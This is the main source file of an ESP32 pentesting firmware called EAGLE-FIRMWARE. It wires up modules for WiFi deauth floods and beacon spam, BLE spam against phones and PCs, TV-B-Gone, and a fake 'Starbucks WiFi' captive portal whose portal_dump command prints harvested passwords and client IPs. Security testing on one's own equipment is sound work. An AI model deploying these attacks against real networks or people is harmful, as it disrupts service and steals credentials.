#include <Arduino.h>
#include <LittleFS.h>

#include "core/board_config.h"
#include "core/module_manager.h"
#include "modules/wifi_module.h"
#include "modules/storage_module.h"
#include "modules/wifi_manager_module.h"
#include "modules/rest_api_module.h"
#include "modules/ota_module.h"
#include "modules/safe_mode_module.h"
// #include "modules/display_module.h"  // Substituído por menu_module
#include "modules/imu_module.h"
#include "modules/mic_module.h"
#include "modules/buzzer_module.h"
#include "modules/self_test_module.h"
#include "modules/menu_module.h"
// EAGLE Pentesting Modules - ACTIVE
#include "modules/wifi_attacks_module.h"
#include "modules/ble_attacks_module.h"
#include "modules/attacks_api_module.h"
#include "modules/ir_module.h"
#include "modules/evil_portal_module.h"
// Enhanced pentesting modules (temporarily disabled for basic build)
// #include "modules/port_scanner_module.h"
// #include "modules/vulnerability_scanner_module.h"
// #include "modules/pentest_web_interface_module.h"
// Bruce-inspired modules (temporarily disabled for basic build)
// #include "modules/wifi_advanced_module.h"
// #include "modules/ble_advanced_module.h"
// #include "modules/rf_advanced_module.h"
// #include "modules/rfid_advanced_module.h"
// #include "modules/ir_advanced_module.h"
// #include "modules/fm_advanced_module.h"
// #include "modules/nrf24_advanced_module.h"
// #include "modules/script_interpreter_module.h"
// #include "modules/espnow_module.h"
// #include "modules/utility_modules.h"

static ModuleManager moduleManager;
static StorageModule storage;
static SafeModeModule safeMode;
static WifiManagerModule wifiManager(storage);
static OtaModule ota(storage);
// static DisplayModule display;  // Substituído por menu
static ImuModule imu;
static MicModule mic;
static BuzzerModule buzzer;
static SelfTestModule selfTest(buzzer);
static MenuModule menu;
// EAGLE Pentesting Modules (declare before RestAPI)
WiFiAttacksModule wifiAttacks;
BLEAttacksModule bleAttacks;
static IRModule irModule;
static EvilPortalModule evilPortal;
// REST API needs access to attack modules
static RestApiModule restApi(storage);
static AttacksApiModule attacksApi;
// Enhanced pentesting modules (temporarily disabled)
// static PortScannerModule portScanner;
// static VulnerabilityScannerModule vulnScanner;
// static PentestWebInterfaceModule pentestWebInterface;
// Bruce-inspired modules (temporarily disabled)
// static WiFiAdvancedModule wifiAdvanced;
// static BLEAdvancedModule bleAdvanced;
// static RFAdvancedModule rfAdvanced;
// static RFIDAdvancedModule rfidAdvanced;
// static IRAdvancedModule irAdvanced;
// static FMAdvancedModule fmAdvanced;
// static NRF24AdvancedModule nrf24Advanced;
// static ScriptInterpreterModule scriptInterpreter;
// static ESPNowModule espnow;
// Utility modules (temporarily disabled)
// static MicrophoneSpectrumModule micSpectrum;
// static QRCodeModule qrCode;
// static SDCardManagerModule sdManager;
// static LittleFSManagerModule littlefsManager;
// static RTCModule rtc;
// static WebUIModule webUI;
// static PIXModule pix;

void setup() {
	Serial.begin(115200);
	delay(500);
	Serial.println("\n\n==================================");
	Serial.println("EAGLE-FIRMWARE (PlatformIO) starting...");
	Serial.printf("Board: %s\n", EAGLE_BOARD_NAME);
	Serial.printf("Free Heap: %d bytes\n", ESP.getFreeHeap());
	Serial.println("==================================");
	delay(100);
	
	// Initialize LittleFS for web interface
	Serial.println("[1/10] Initializing LittleFS...");
	if (!LittleFS.begin(true)) {
		Serial.println("[ERROR] LittleFS Mount Failed");
	} else {
		Serial.println("[OK] LittleFS mounted");
	}
	delay(100);

	Serial.println("[2/10] Registering core modules...");
	moduleManager.registerModule(&safeMode);
	delay(50);
	moduleManager.registerModule(&storage);
	delay(50);
	moduleManager.registerModule(&wifiManager);
	delay(50);
	moduleManager.registerModule(&restApi);
	delay(50);
	moduleManager.registerModule(&ota);
	delay(50);
	Serial.println("[OK] Core modules registered");
	Serial.println("[3/10] Registering hardware modules...");
	// Display substituído por menu interativo
	// moduleManager.registerModule(&display);
	// IMU disabled (not critical)
	// moduleManager.registerModule(&imu);
	moduleManager.registerModule(&mic);
	delay(50);
	moduleManager.registerModule(&buzzer);
	delay(50);
	moduleManager.registerModule(&selfTest);
	delay(50);
	Serial.println("[OK] Hardware modules registered");
	// EAGLE Pentesting Modules
	Serial.println("[4/10] Registering attack modules...");
	moduleManager.registerModule(&wifiAttacks);
	delay(50);
	moduleManager.registerModule(&bleAttacks);
	delay(50);
	moduleManager.registerModule(&irModule);
	delay(50);
	moduleManager.registerModule(&evilPortal);
	delay(50);
	moduleManager.registerModule(&attacksApi);
	delay(50);
	Serial.println("[OK] Attack modules registered");
	
	// Menu interativo (último para ter acesso a todos os módulos)
	Serial.println("[5/10] Registering interactive menu...");
	menu.setWiFiAttacks(&wifiAttacks);
	menu.setBLEAttacks(&bleAttacks);
	menu.setIRModule(&irModule);
	menu.setEvilPortal(&evilPortal);
	moduleManager.registerModule(&menu);
	delay(50);
	Serial.println("[OK] Interactive menu registered");
	// Enhanced pentesting modules (temporarily disabled)
	// moduleManager.registerModule(&portScanner);
	// moduleManager.registerModule(&vulnScanner);
	// moduleManager.registerModule(&pentestWebInterface);
	// Bruce-inspired modules (temporarily disabled)
	// moduleManager.registerModule(&wifiAdvanced);
	// moduleManager.registerModule(&bleAdvanced);
	// moduleManager.registerModule(&rfAdvanced);
	// moduleManager.registerModule(&rfidAdvanced);
	// moduleManager.registerModule(&irAdvanced);
	// moduleManager.registerModule(&fmAdvanced);
	// moduleManager.registerModule(&nrf24Advanced);
	// moduleManager.registerModule(&scriptInterpreter);
	// moduleManager.registerModule(&espnow);
	// Utility modules (temporarily disabled)
	// moduleManager.registerModule(&micSpectrum);
	// moduleManager.registerModule(&qrCode);
	// moduleManager.registerModule(&sdManager);
	// moduleManager.registerModule(&littlefsManager);
	// moduleManager.registerModule(&rtc);
	// moduleManager.registerModule(&webUI);
	// moduleManager.registerModule(&pix);
	
	// Configure module relationships (temporarily disabled)
	// pentestWebInterface.setPortScanner(&portScanner);
	// pentestWebInterface.setVulnScanner(&vulnScanner);
	
	Serial.println("[6/10] Initializing all modules...");
	Serial.println("This may take a moment...");
	moduleManager.setupAll();
	Serial.println("[OK] All modules initialized");
	
	// Welcome banner
	Serial.println("\n\n");
	Serial.println("========================================");
	Serial.println("   🦅 EAGLE-FIRMWARE v1.0");
	Serial.println("   Advanced ESP32 Pentesting Platform");
	Serial.println("========================================");
	Serial.println("\n✅ WiFi Attacks: ACTIVE");
	Serial.println("✅ BLE Attacks: ACTIVE");
	Serial.println("✅ IR Attacks: ACTIVE");
	Serial.println("✅ Evil Portal: ACTIVE");
	Serial.println("✅ Web Interface: ACTIVE\n");
	Serial.println("⚠️  USE ONLY ON YOUR OWN EQUIPMENT!");
	Serial.println("⚠️  UNAUTHORIZED USE IS ILLEGAL!\n");
	Serial.println("Type 'help' for available commands\n");
	Serial.println("========================================\n");
}

void loop() {
	moduleManager.loopAll();
	
	// Serial command interface
	if (Serial.available()) {
		String cmd = Serial.readStringUntil('\n');
		cmd.trim();
		cmd.toLowerCase();
		
		Serial.println("\n[EAGLE] Command: " + cmd);
		
		// WiFi Attacks
		if (cmd == "wifi_scan") {
			Serial.println("[WiFi] Scanning networks...");
			auto nets = wifiAttacks.scanNetworks();
			Serial.printf("[WiFi] Found %d networks\n", nets.size());
		}
		else if (cmd == "wifi_beacon_spam") {
			Serial.println("[WiFi] Starting Beacon Spam...");
			std::vector<String> ssids = {"Free WiFi", "FBI Van", "Virus.exe", "TestNet", "Hack Me"};
			wifiAttacks.startBeaconSpam(ssids);
		}
		else if (cmd == "wifi_deauth_flood") {
			Serial.println("[WiFi] Starting Deauth Flood...");
			wifiAttacks.startDeauthFlood();
		}
		// BLE Attacks
		else if (cmd == "ble_scan") {
			Serial.println("[BLE] Scanning devices...");
			bleAttacks.scanBLEDevices(10);
		}
		else if (cmd == "ble_spam_all") {
			Serial.println("[BLE] Starting SPAM ALL...");
			bleAttacks.startBLESpam(SPAM_ALL);
		}
		else if (cmd == "ble_spam_ios") {
			Serial.println("[BLE] Starting iOS Spam (Apple Juice)...");
			bleAttacks.startAppleJuiceAttack();
		}
		else if (cmd == "ble_spam_android") {
			Serial.println("[BLE] Starting Android Spam (Fast Pair)...");
			bleAttacks.startFastPairAttack();
		}
		else if (cmd == "ble_spam_samsung") {
			Serial.println("[BLE] Starting Samsung Spam...");
			bleAttacks.startSamsungSpam();
		}
		else if (cmd == "ble_spam_windows") {
			Serial.println("[BLE] Starting Windows Spam (Swift Pair)...");
			bleAttacks.startSwiftPairAttack();
		}
		// IR Attacks
		else if (cmd == "ir_tvbgone") {
			Serial.println("[IR] Starting TV-B-Gone...");
			irModule.tvbGone();
		}
		// Evil Portal
		else if (cmd == "evil_portal") {
			Serial.println("[Evil Portal] Starting captive portal...");
			evilPortal.startPortal("Free WiFi", "Starbucks WiFi");
		}
		else if (cmd == "portal_status") {
			Serial.printf("[Evil Portal] Active: %s\n", evilPortal.isPortalActive() ? "YES" : "NO");
			Serial.printf("[Evil Portal] Credentials captured: %d\n", evilPortal.getCredentialCount());
		}
		else if (cmd == "portal_dump") {
			auto creds = evilPortal.getCapturedCredentials();
			Serial.printf("\n[Evil Portal] Dumping %d credentials:\n", creds.size());
			for (size_t i = 0; i < creds.size(); i++) {
				Serial.printf("  [%d] SSID: %s | Password: %s | IP: %s | Time: %s\n",
							  i + 1, creds[i].ssid.c_str(), creds[i].password.c_str(),
							  creds[i].clientIP.toString().c_str(), creds[i].timestamp.c_str());
			}
		}
		// Control
		else if (cmd == "stop") {
			Serial.println("[EAGLE] Stopping all attacks...");
			wifiAttacks.stopAttack();
			bleAttacks.stopSpam();
			evilPortal.stopPortal();
		}
		else if (cmd == "status") {
			Serial.println("\n=== EAGLE-FIRMWARE Status ===");
			Serial.printf("Board: %s\n", EAGLE_BOARD_NAME);
			Serial.printf("Free RAM: %d KB\n", ESP.getFreeHeap() / 1024);
			Serial.printf("Uptime: %lu seconds\n", millis() / 1000);
			Serial.printf("WiFi Attack Active: %s\n", wifiAttacks.isAttackActive() ? "YES" : "NO");
			Serial.printf("BLE Spam Active: %s\n", bleAttacks.isSpamActive() ? "YES" : "NO");
			Serial.printf("Evil Portal Active: %s\n", evilPortal.isPortalActive() ? "YES" : "NO");
			Serial.printf("Credentials Captured: %d\n", evilPortal.getCredentialCount());
			Serial.println("===========================\n");
		}
		else if (cmd == "help") {
			Serial.println("\n=== EAGLE-FIRMWARE Commands ===");
			Serial.println("WiFi Attacks:");
			Serial.println("  wifi_scan              - Scan WiFi networks");
			Serial.println("  wifi_beacon_spam       - Start Beacon Spam");
			Serial.println("  wifi_deauth_flood      - Start Deauth Flood");
			Serial.println("\nBLE Attacks:");
			Serial.println("  ble_scan               - Scan BLE devices");
			Serial.println("  ble_spam_all           - Spam all types");
			Serial.println("  ble_spam_ios           - iOS spam (Apple Juice)");
			Serial.println("  ble_spam_android       - Android spam (Fast Pair)");
			Serial.println("  ble_spam_samsung       - Samsung spam");
			Serial.println("  ble_spam_windows       - Windows spam (Swift Pair)");
			Serial.println("\nIR Attacks:");
			Serial.println("  ir_tvbgone             - TV-B-Gone (power off TVs)");
			Serial.println("\nEvil Portal:");
			Serial.println("  evil_portal            - Start captive portal");
			Serial.println("  portal_status          - Portal status");
			Serial.println("  portal_dump            - Dump captured credentials");
			Serial.println("\nControl:");
			Serial.println("  stop                   - Stop all attacks");
			Serial.println("  status                 - System status");
			Serial.println("  help                   - Show this help");
			Serial.println("================================\n");
		}
		else if (cmd.length() > 0) {
			Serial.println("[EAGLE] Unknown command. Type 'help' for commands.");
		}
	}
	
	delay(50);
}


